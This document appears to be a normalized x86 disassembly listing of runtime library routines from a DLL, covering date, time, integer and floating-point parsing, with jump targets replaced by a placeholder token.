push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_10007340
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_10007340
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_10007340
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_10007340
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_10007340
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10005f4d
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10006020
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100068a0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10005f4d
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10048566
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_10048bf1
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10048566
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_10048c5f
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065ea
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10048c9f
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100065ea
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10048cdf
push 0x98
mov eax sub_1004f917
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_100484d1
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_10048d89
push 0x60
mov eax sub_1004f423
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007dd5
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_100463e3
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007dd5
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10044e48
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10007dbd
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_100439b4
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1003f21b
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10043195
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10042e00
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10043259
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10043240
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10043195
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10042e00
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10043580
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10042e00
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10048f27
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100463e3
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10048ff6
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100463e3
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_100490c1
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100463e3
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100229f4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_1004916f
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100463e3
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_1004921d
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100463e3
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022a99
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_100492d4
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100463e3
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022b5c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_1004938b
push 0x50
mov eax sub_1004ed97
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_10046733
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d61
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_10049433
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10046733
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d83
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_100494db
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10046733
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022dec
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_10049583
push 0x38
